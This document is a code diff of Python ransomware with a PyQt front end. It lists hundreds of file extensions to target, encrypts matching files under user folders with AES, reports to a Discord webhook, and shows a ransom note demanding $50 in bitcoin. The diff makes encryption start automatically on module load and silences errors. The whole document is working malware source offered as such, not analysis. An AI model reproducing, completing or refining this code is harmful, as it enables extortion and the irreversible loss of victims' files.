@@ -19,22 +19,20 @@ discordWebhook = ""
 fileTypes = ['.txt','.exe','.php','.pl','.7z','.rar','.m4a','.wma','.avi','.wmv','.csv','.d3dbsp','.sc2save','.sie','.sum','.ibank','.t13','.t12','.qdf','.gdb','.tax','.pkpass','.bc6','.bc7','.bkp','.qic','.bkf','.sidn','.sidd','.mddata','.itl','.itdb','.icxs','.hvpl','.hplg','.hkdb','.mdbackup','.syncdb','.gho','.cas','.svg','.map','.wmo','.itm','.sb','.fos','.mcgame','.vdf','.ztmp','.sis','.sid','.ncf','.menu','.layout','.dmp','.blob','.esm','.001','.vtf','.dazip','.fpk','.mlx','.kf','.iwd','.vpk','.tor','.psk','.rim','.w3x','.fsh','.ntl','.arch00','.lvl','.snx','.cfr','.ff','.vpp_pc','.lrf','.m2','.mcmeta','.vfs0','.mpqge','.kdb','.db0','.mp3','.upx','.rofl','.hkx','.bar','.upk','.das','.iwi','.litemod','.asset','.forge','.ltx','.bsa','.apk','.re4','.sav','.lbf','.slm','.bik','.epk','.rgss3a','.pak','.big','.unity3d','.wotreplay','.xxx','.desc','.py','.m3u','.flv','.js','.css','.rb','.png','.jpeg','.p7c','.p7b','.p12','.pfx','.pem','.crt','.cer','.der','.x3f','.srw','.pef','.ptx','.r3d','.rw2','.rwl','.raw','.raf','.orf','.nrw','.mrwref','.mef','.erf','.kdc','.dcr','.cr2','.crw','.bay','.sr2','.srf','.arw','.3fr','.dng','.jpeg','.jpg','.cdr','.indd','.ai','.eps','.pdf','.pdd','.psd','.dbfv','.mdf','.wb2','.rtf','.wpd','.dxg','.xf','.dwg','.pst','.accdb','.mdb','.pptm','.pptx','.ppt','.xlk','.xlsb','.xlsm','.xlsx','.xls','.wps','.docm','.docx','.doc','.odb','.odc','.odm','.odp','.ods','.odt','.sql','.zip','.tar','.tar.gz','.tgz','.biz','.ocx','.html','.htm','.3gp','.srt','.cpp','.mid','.mkv','.mov','.asf','.mpeg','.vob','.mpg','.fla','.swf','.wav','.qcow2','.vdi','.vmdk','.vmx','.gpg','.aes','.ARC','.PAQ','.tar.bz2','.tbk','.bak','.djv','.djvu','.bmp','.cgm','.tif','.tiff','.NEF','.cmd','.class','.jar','.java','.asp','.brd','.sch','.dch','.dip','.vbs','.asm','.pas','.ldf','.ibd','.MYI','.MYD','.frm','.dbf','.SQLITEDB','.SQLITE3','.asc','.lay6','.lay','.ms11(Securitycopy)','.sldm','.sldx','.ppsm','.ppsx','.ppam','.docb','.mml','.sxm','.otg','.slk','.xlw','.xlt','.xlm','.xlc','.dif','.stc','.sxc','.ots','.ods','.hwp','.dotm','.dotx','.docm','.DOT','.max','.xml','.uot','.stw','.sxw','.ott','.csr','.key','wallet.dat']
 
 
-class Ransomware(PyQt5.QtCore.QRunnable):
+class Ransomware():
 	def __init__(self):
-		super(Ransomware, self).__init__()
-		self.threadpool = PyQt5.QtCore.QThreadPool()
 		self.randomId = self.rID(12)
 		self.encryptionPass = self.rSeed(32)
-		self.filePath = "C:\\Users\\"
+		self.filePath = ""
 		self.ip = ""
 		self.userName = ""
 		self.crypto = AES.new(self.encryptionPass.encode(), AES.MODE_ECB)
+		self.run()
 
 	def readMe(self):
 		try:
 			f = open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt","w+")
 			f.write(note)
-			f.close()
 		except:
 			pass
 	def getUserDetails(self):
@@ -54,14 +52,20 @@ class Ransomware(PyQt5.QtCore.QRunnable):
 			pass
 
 	def run(self):
-		self.sendMessage()
-		for root, directories, files in os.walk(self.filePath):
-			for filename in files:
-				filepath = os.path.join(root, filename)
-				for base in fileTypes:
-					if base in filepath:
-						threading.Thread(target=self.encryptFile, args=(filepath,)).start()
-		
+		try:
+			self.sendMessage()
+		except:
+			pass
+		for subdir, dirs, files in os.walk(self.filePath):
+			for file in files:
+				filepath = subdir + os.sep + file
+				for ft in fileTypes:
+					if ft in filepath:
+						try:
+							threading.Thread(target=self.encryptFile, args=(filepath,)).start()
+						except:
+							pass
+			
 		self.readMe()
 
 	def sendMessage(self):
@@ -96,6 +100,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):
 		password_characters = string.ascii_letters + string.digits
 		return ''.join(random.choice(password_characters) for i in range(stringLength))
 
+r = Ransomware()
 
 class Scrypt(PyQt5.QtWidgets.QMainWindow):
 	def __init__(self):
@@ -106,7 +111,6 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
 		self.cont()
 		self.readMe()	
 		self.show()
-		self.threadpool.start(Ransomware())
 
 	def initUI(self):
 		self.setWindowFlags(PyQt5.QtCore.Qt.WindowCloseButtonHint | PyQt5.QtCore.Qt.WindowType_Mask)
@@ -183,7 +187,7 @@ Hello,\n
 	all your files.\n
 	1. Download BitPay: https://bitpay.com/wallet/ if you are using a different wallet thats fine.\n
 	2. Send $50 to this address: {btcAdd}\n
-	3. After sending it wait for a confirmation and send us an email and include your UniqueID: {Ransomware().randomId}\n
+	3. After sending it wait for a confirmation and send us an email and include your UniqueID: {r.randomId}\n
 	4. Wait shortly, you will receive an email with your decrypter once everything is handled.\n
 	5. If we do not receive payment within 2 weeks we will no longer be handeling support.
 -------------------------------------------------------------------------------------------------------------------------
@@ -201,14 +205,15 @@ Check your desktop for readme.txt if you are lost!\n
 ------------------------------------\n
 BTC Address: {btcAdd}\n
 Email: {email}\n
-UniqueID: {Ransomware().randomId}\n
+UniqueID: {r.randomId}\n
 ------------------------------------\n
 Click the Button Below To Continue:
 (Killing this program will result in a full lose of files)\n
 """
 
 if __name__ == "__main__":
-		app = PyQt5.QtWidgets.QApplication(sys.argv) 
-		l = Scrypt() 
-		sys.exit(app.exec()) 
+	
+	app = PyQt5.QtWidgets.QApplication(sys.argv) 
+	l = Scrypt() 
+	sys.exit(app.exec()) 
 
